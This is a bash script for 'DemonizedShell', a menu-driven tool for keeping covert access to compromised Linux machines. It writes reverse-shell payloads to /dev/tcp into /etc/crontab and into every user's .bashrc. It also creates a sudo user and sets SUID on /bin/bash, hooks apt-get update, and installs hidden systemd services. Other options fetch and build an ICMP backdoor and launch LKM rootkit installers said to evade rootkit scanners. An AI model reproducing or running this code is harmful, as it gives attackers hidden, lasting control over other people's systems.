#!/bin/bash

rainbow() {
    local text=$1
    echo "$text" #| lolcat -p 0.3 -a -d 1
}

requirements() {
    sudo apt-get install lolcat git make gcc -y
}

crontab() {
    rainbow " [*] Crontab Persistence [*] "
    echo -e "\n"
    rainbow "Want to insert a custom command into crontab?"
    rainbow "Enter 'yes' to enter a custom command or 'no' to run the default command."
    read resposta

    if [[ $resposta == "yes" ]]; then
      rainbow "Enter the command you want to add to the crontab: "
      read comando
    else
      rainbow "Enter the IP address: "
      read ip

      rainbow "Enter port: "
      read porta

      comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
    fi

    rainbow "Adding command to crontab..."
    echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
    rainbow "Command successfully added!"
}

bashRCPersistence() {
    rainbow " [*] .bashrc Persistence [*] "
    echo -e "\n"

      rainbow "Enter your listener's IP address: "
      read ip

      rainbow "Enter the port number of your listener: "
      read porta

      payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"

      for usuario in /home/*; do
        if [ -d "$usuario" ]; then
          rainbow "Inserting the reverse shell payload in the .bashrc of $user..."
          rainbow "$payload" >> "$usuario/.bashrc"
          rainbow "Payload successfully inserted into $usuario/.bashrc"
        fi
      done
    rainbow ".bashrc persistence setup successfully!!"
}

userANDBashSUID() {
    rainbow " [*] Privileged User & SUID /bin/bash [*] "
    echo -e "\n"

    rainbow "Enter a name for the user: "
    read user

    adduser $user
    usermod -aG sudo $user
    chmod u+s /bin/bash

    rainbow "User $username created with root permissions and SUID set in /bin/bash"
}

apthooking() {
    rainbow " [ * ]  hooking the apt-get update command [ * ] "
    echo -e "\n"

    rainbow "Enter a payload or command, as soon as the user enters sudo apt-get update, this command that you enter below will be executed!"
    read command

    sudo touch /etc/apt/apt.conf.d/1aptget
    echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

    rainbow "Your hook is in /etc/apt/apt.conf.d/1aptget with the command: $command"
}

systemdUser() {
    rainbow "[ * ] Systemd User level [ * ] "

    echo -e "\n"

      rainbow "Do you want to run a script? (Y/n): "
      read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > ~/.config/systemd/user/hidden.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl --user daemon-reload

      systemctl --user enable hidden.service
      systemctl --user start hidden.service
    fi

    rainbow "Systemd Persistence at user level setup successfully!!"
}
systemdRoot() {
    rainbow "[ * ] Systemd root level [ * ] "

    echo -e "\n"

    rainbow "Do you want to run a script? (Y/n): "
    read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > /etc/systemd/system/hidden2.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl daemon-reload

      systemctl enable hidden2.service
      systemctl start hidden2.service

      rainbow "Systemd Root level setup successfully!"
    fi
}

sshGen() {
    while IFS=':' read -r username password uid gid full_name home shell; do
        if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
            rainbow "User $username has shell $shell"

            if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
                rainbow "Generating ssh-key for user $username"

                sleep 5

                mkdir -p "$home/.ssh"

                ssh-keygen -t rsa -N "" -f "$home/.ssh/id_rsa"

                chmod 700 "$home/.ssh"
                chmod 600 "$home/.ssh/id_rsa"
                chown -R "$username:$username" "$home/.ssh"

                clear
            else
                rainbow "SSH key already exists for user $username"
            fi
        fi
    done < "/etc/passwd"

    sleep 3

    rainbow "SSH-KEY successfully generated for all valid users!!"
}

lkmRootkitmodified() {
  chmod +x scripts/implant_rootkit.sh
  cd scripts
  ./implant_rootkit.sh
}

icmpBackdoor() {
  rainbow "Enter the IP address that will receive the ping: "
  read LHOST
  rainbow "Enter the port number that will receive the connection: "
  read LPORT
  git clone https://github.com/MrEmpy/Pingoor
  cd Pingoor
  make HOST=$LHOST PORT=$LPORT
  rainbow "Backdoor compiled. You can find it at Pingoor/pingoor"
}

lkmRootkit(){
  chmod +x scripts/install_locutus.sh
  cd scripts
  ./install_locutus.sh
}

SetupLdPreloadPrivesc(){
  chmod +x scripts/ld.sh
  cd scripts
  ./ld.sh
}

AntirevTechnique(){
  git clone https://github.com/MatheuZSecurity/NullSection
  cd NullSection
  gcc nullsection.c -o nullsection
  ./nullsection
}

MaliciousInit(){
	chmod +x scripts/init.sh
	cd scripts
	./init.sh
}

rcLocalPersis(){
	chmod +x scripts/rclocal.sh
	cd scripts
	./rclocal.sh
}

banner() {
    rainbow "
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                    TM         (_.)  _  )   /
  |  | |\  | ~|~ \ /             \`.___/ \`    /
  |  | | \ |  |   X                \`-----' /
  \`__| |  \| _|_ / \\  <----.     __ / __   \\
      version 1.2     <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\

  DemonizedShell is a Tool to gain persistence on linux systems"
    printf "\n\n"
}

menu() {
    cat << EOF 
  [01] Generate SSH keypair       [06] Bashrc Persistence
  [02] APT Persistence            [07] Privileged user & SUID bash
  [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
  [04] Systemd User level         [09] ICMP Backdoor
  [05] Systemd Root Level         [10] LKM Rootkit
                                  [11] Setup privesc LD_PRELOAD
                                  [12] Anti-Reversing Technique - Overwrite Section Header with Null Bytes
                                  [13] Init.d Persistence
                                  [14] rc.local Persistence

    [*] Coming soon others features [*]

EOF

    printf "[D3m0niz3d]~# "

    read MENUINPUT

    if [ "$MENUINPUT" == "1" ] || [ "$MENUINPUT" == "01" ]; then
        sshGen
    elif [ "$MENUINPUT" == "2" ] || [ "$MENUINPUT" == "02" ]; then
        apthooking
    elif [ "$MENUINPUT" == "3" ] || [ "$MENUINPUT" == "03" ]; then
        crontab
    elif [ "$MENUINPUT" == "4" ] || [ "$MENUINPUT" == "04" ]; then
        systemdUser
    elif [ "$MENUINPUT" == "5" ] || [ "$MENUINPUT" == "05" ]; then
        systemdRoot
    elif [ "$MENUINPUT" == "6" ] || [ "$MENUINPUT" == "06" ]; then
        bashRCPersistence
    elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
        userANDBashSUID
    elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
        lkmRootkitmodified
    elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
        icmpBackdoor
    elif [ "$MENUINPUT" == "10" ] || [ "$MENUINPUT" == "10" ]; then
        lkmRootkit
    elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
        SetupLdPreloadPrivesc
    elif [ "$MENUINPUT" == "12" ] || [ "$MENUINPUT" == "12" ]; then
        AntirevTechnique
    elif [ "$MENUINPUT" == "13" ] || [ "$MENUINPUT" == "13" ]; then
        MaliciousInit
    elif [ "$MENUINPUT" == "14" ] || [ "$MENUINPUT" == "14" ]; then
        rcLocalPersis
    else 
        echo "This option does not exist"
    fi
}

main() {
    if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
    fi

    requirements
    clear
    banner
    sleep 0.5

    menu
}

main
